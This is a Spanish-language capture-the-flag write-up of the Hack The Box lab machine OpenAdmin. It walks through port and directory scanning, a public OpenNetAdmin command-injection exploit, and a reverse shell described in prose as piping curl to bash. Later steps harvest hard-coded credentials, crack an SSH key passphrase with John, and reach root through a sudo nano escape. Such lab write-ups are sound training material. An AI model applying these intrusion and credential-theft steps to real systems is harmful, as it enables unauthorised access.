---
title: "OpenAdmin - HTB Writeup"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/126904915-10a62d2c-8f91-4dc4-82b4-14954df4c36d.png"
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - ShellShock
  - Perl
  - sudo
---

![título](https://user-images.githubusercontent.com/67548295/124387610-cae04080-dcce-11eb-932a-6940d389c173.jpeg)


# Enumeración

Comenzamos enviando una traza ICMP a la máquina para verificar que está activa.

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ping -c 1 10.10.10.171
PING 10.10.10.171 (10.10.10.171) 56(84) bytes of data.
64 bytes from 10.10.10.171: icmp_seq=1 ttl=63 time=59.7 ms

--- 10.10.10.171 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 59.701/59.701/59.701/0.000 ms
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $
```
La máquina nos responde, y mediante el TTL veo que es una máquina Linux.

Más información sobre la detección de OS mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/).

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier).

# Nmap

Hacemos uso de la herramienta ```nmap``` para escanear los puertos y servicios de la máquina:

```bash
nmap -p- --open -T5 -n 10.10.10.171 -sC -sV 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 15:14 WEST
Nmap scan report for 10.10.10.171
Host is up (0.059s latency).
Not shown: 57738 closed ports, 7795 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.52 seconds
```
Solo hay un servicio SSH y HTTP, enumeremos el servicio HTTP

# user.txt

Antes de visitar el servidor web, vamos a fuzzearlo con gobuster:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/OpenAdmin/nmap]
└──╼ $gobuster dir -u http://10.10.10.171/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171/
[+] Threads:        50
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/07/04 19:22:52 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
/server-status (Status: 403)
===============================================================
2021/07/04 19:27:48 Finished
===============================================================
```

Como se puede ver, tenemos 3 rutas que podemos probar.

Investiguemos la primera:

![navegador1](https://user-images.githubusercontent.com/67548295/124395986-a730f080-dcf6-11eb-879f-0bd5de884c5a.png)

Vemos como si fuera una página web de música.

Se puede observar que hay una opción de login asi que voy ahí para ver si puedo iniciar sesión con credenciales comunes,

Y me encuentro con una sorpresa:

![navegador2](https://user-images.githubusercontent.com/67548295/124396088-21617500-dcf7-11eb-93c0-35a07dd74bd1.png)

El botón de login nos redirige a un servicio con nombre _OpenNetAdmin_.

Vemos que nos muestra una versión, asi que investigo para ver si esa versión tiene vulnerabilidades.

Y sí, hay una vulnerabilidad para esta versión que nos permite ejecutar comandos en el sistema de forma remota:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $searchsploit opennetadmin 18.1.1
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                                             | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                                              | php/webapps/47691.sh
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
El exploit daba problemas al ejecutarlo, le hice un ```dos2unix``` y ya lo pude utilizar.

Hacemos una simple reverse shell en bash, creando un archivo con la reverse shell y haciendo un servidor con python, para luego desde el RCE
hacer un curl a nuestra IP, pipearlo con bash y ganar acceso al sistema:

```bash
www-data@openadmin:/opt/ona/www$ id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Tendríamos acceso como www-data.

Después de enumerar el sistema, me encuentro una contraseña en el directorio donde esta alojado el servicio OpenNetAdmin:

```bash
www-data@openadmin:/opt/ona$ grep -i -r "passw"

[...]

www/include/auth/ldap.class.php:            // User/Password bind
www/include/auth/local.class.php:   * Check user+password [ MUST BE OVERRIDDEN ]
www/include/auth/local.class.php:   * password is correct
www/include/auth/local.class.php:   *     found user should be set if we find the user even if the password does not match
www/include/auth/local.class.php:            // check that the password is the same.
www/include/auth/local.class.php:            if($md5pass === $user['password']) {
www/config/auth_ldap.config.php://$conf['auth']['ldap']['bindpw']   = 'mysecretbindpassword';
www/.htaccess.example:# who is a defined user within the system.  No password is required.
www/.htaccess.example:# You will need to create an .htpasswd file that conforms to the standard
www/.htaccess.example:# htaccess format, read the man page for htpasswd.  Change the 
www/.htaccess.example:# AuthUserFile option below as needed to reference your .htpasswd file.
www/.htaccess.example:# Keep in mind that this password is not necassarily the same password
www/.htaccess.example:# names, however, do need to be the same in both the .htpasswd and web
www/.htaccess.example:# an https:// type url.  dcm.pl allows you to specify a user/password 
www/.htaccess.example:# You can choose to use the IP filter, password or both for authentication.
www/.htaccess.example:    # This section allows you to force a password
www/.htaccess.example:    #AuthUserFile /opt/ona/www/.htpasswd
www/dcm.php:// be careful as this currently does not require a password.
www/local/config/database_settings.inc.php:        'db_passwd' => 'n1xxxxxxxi0R!',
www/winc/user_edit.inc.php:                Password
www/winc/user_edit.inc.php:                    name="passwd"
www/winc/user_edit.inc.php:                    alt="Password"
www/winc/user_edit.inc.php:                    type="password"
www/winc/user_edit.inc.php:    if (!$form['id'] and !$form['passwd']) {
www/winc/user_edit.inc.php:        $js .= "alert('Error! A password is required to create a new employee!');";
www/winc/user_edit.inc.php:    // md5sum the password if there is one
www/winc/user_edit.inc.php:    if ($form['passwd']) {
www/winc/user_edit.inc.php:        $form['passwd'] = md5($form['passwd']);
www/winc/user_edit.inc.php:                'passwd'      => $form['passwd'],
www/winc/user_edit.inc.php:        if (strlen($form['passwd']) < 32) {
www/winc/user_edit.inc.php:            $form['passwd'] = $record['passwd'];
www/winc/user_edit.inc.php:                'passwd'      => $form['passwd'],

[...]
```
Miro el /etc/passwd para ver si hay mas usuarios en el sistema y veo que hay mas usuarios:

```bash
www-data@openadmin:/opt/ona$ grep -E 1[0-9]{3}  /etc/passwd | sed s/:/\ / | awk '{print $1}'

jimmy
joanna
```

Pruebo a migrar de usuario con la contraseña que encontré, y funcionó con el usuario jimmy.

Tras enumerar de nuevo el sistema como el usuario jimmy, me doy cuenta de que pertenece al grupo _internal_

Hago uso de la utilidad ```find``` para ver los archivos tienen internal de grupo asignado:

```bash
jimmy@openadmin:~$ id

uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)

jimmy@openadmin:~$ find / -group internal 2>/dev/null

/var/www/internal
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/index.php
```
Al parecer hay algunos archivos que parecen pertenecer a un servicio web o algo parecido.

Hago de nuevo uso de la utilidad ```grep``` para buscar contraseñas de forma recursiva en estos archivos:

```bash
jimmy@openadmin:/var/www/internal$ grep -i -r "passw"

main.php:<h3>Don't forget your "ninja" password</h3>
logout.php:   unset($_SESSION["password"]);
index.php:         .form-signin input[type="password"] {
index.php:      <h2>Enter Username and Password</h2>
index.php:            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
index.php:              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXf9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
index.php:                  $msg = 'Wrong username or password.';
index.php:            <input type = "password" class = "form-control"
index.php:               name = "password" required>
```

Y si, vemos como si fuera la estructura de un panel de login.

El programador que hizo el panel de login utilizó malas practicas de programación y dejó el usuario y la contraseña hardcodeada en el código.

Ya que se ve que es un pequeño servicio web, enumero los puertos abiertos internamente para ver si hay alguno en el que pueda estar corriendo este servicio:

```bash
jimmy@openadmin:/var/www/internal$ netstat -nat

Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 10.10.10.171:52664      10.10.10.171:22         ESTABLISHED
tcp        0    138 10.10.10.171:41658      10.10.14.230:1234       ESTABLISHED
tcp        0      0 10.10.10.171:22         10.10.14.168:57682      ESTABLISHED
tcp        0      0 10.10.10.171:22         10.10.10.171:52664      ESTABLISHED
tcp        0      0 10.10.10.171:22         10.10.14.168:59864      ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 ::1:8000                :::*                    LISTEN     
tcp6       0      0 10.10.10.171:80         10.10.14.39:33074       TIME_WAIT  
tcp6       1      0 10.10.10.171:80         10.10.14.230:58168      CLOSE_WAIT 
```
Hay un puerto poco comun abierto, el _52846_, para ver si contiene algo, hago un local port forwarding con ssh para poder verlo desde mi navegador:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ssh jimmy@10.10.10.171 -L 52846:127.0.0.1:52846
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jul  5 12:30:21 UTC 2021

  System load:  0.0               Processes:             132
  Usage of /:   49.9% of 7.81GB   Users logged in:       2
  Memory usage: 31%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Jul  5 11:12:12 2021 from 10.10.14.168
jimmy@openadmin:~$ 
```
Una vez hecho el local port forwarding, voy al navegador a ver si existe algun servicio web en ese puerto.

Y sí, como habíamos predicho, hay un panel de login:

![navegador3](https://user-images.githubusercontent.com/67548295/124472494-b8790c00-dd8d-11eb-95a6-0d4e4dec9faa.png)

Si recordaís, habia credenciales hardcodeadas en los archivos de configuracion de este panel de login.

Había un hash de contraseña y un usuario.

Pruebo a poner el hash en [crackstation](https://crackstation.net) para ver si está en su base de datos.

Y sí:

![navegador4](https://user-images.githubusercontent.com/67548295/124473079-684e7980-dd8e-11eb-9ca6-0b5a2b2938b8.png)

Después de esto pruebo a ingresar el usuario y la contraseña en el panel de login del que habiamos hecho el port forwarding.

Y estas son válidas.

Al ingresar, me encuentro con una clave id_rsa protegida con contraseña:

![navegador5](https://user-images.githubusercontent.com/67548295/124473459-e3179480-dd8e-11eb-9b31-0ac698a9f1b5.png)

Para averiguar la contraseña de esta id_rsa, hago uso de la utilidad ```ssh2john``` para generar un hash que crackearé con ```JohnTheRipper```

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/OpenAdmin/content]
└──╼ $ ssh2john.py id_rsa > hash

┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/OpenAdmin/content]
└──╼ $ john --wordlist=/home/z3r0byte/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bXXXXXXXXXs      (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:04 DONE (2021-07-05 13:53) 0.2008g/s 2879Kp/s 2879Kc/s 2879KC/sa6_123..*7¡Vamos!
Session completed
```
Hemos crackeado la contraseña!!!

Suponiendo que la id_rsa es de _joanna_, intento conectarme por ssh con la id_rsa:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/OpenAdmin/content]
└──╼ $ssh -i id_rsa joanna@10.10.10.171
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jul  5 12:55:50 UTC 2021

  System load:  0.0               Processes:             153
  Usage of /:   49.9% of 7.81GB   Users logged in:       2
  Memory usage: 32%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Jul  5 11:14:27 2021 from 10.10.14.168
joanna@openadmin:~$ 
```
Y pa' dentro.

A partir de aquí ya podríamos ver la flag user.txt en el directorio home de joanna:

```bash
joanna@openadmin:~$ cat user.txt

c9b2cf07d4XXXXXXXXXXXXXX0c81b5f

```
# root.txt

Vuelvo a enumerar el sistema y me encuentro con esto:

```bash
joanna@openadmin:~$ sudo -l

Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

El usuario joanna puede ejecutar nano para editar el archivo /opt/priv con privilegios de root.

Yo aqui estuve estancado un rato porque pensaba que tenia algo que ver con el archivo priv. Pero no.

Nano tiene una opcion para ejecutar comandos, y estamos corriendo nano como usuario root, así que obtener una shell es sencillo.

Yo en este caso usé [GTFObins](https://gtfobins.github.io/) para ver como era el procedimiento:

![navegador6](https://user-images.githubusercontent.com/67548295/124475302-13f8c900-dd91-11eb-8d09-1994a0355598.png)

Hacemos este procedimiento ejecutando nano con sudo (sudo /bin/nano /opt/priv) y ya seríamos root y podríamos ver la flag:

```bash
# id

uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt

2f907ed450XXXXXXXXXXX5b561
```

# Opinión

La máquina era de dificultad easy pero sin embargo me ha gustado, ha incluido varios conceptos y me ha permitido repasar.







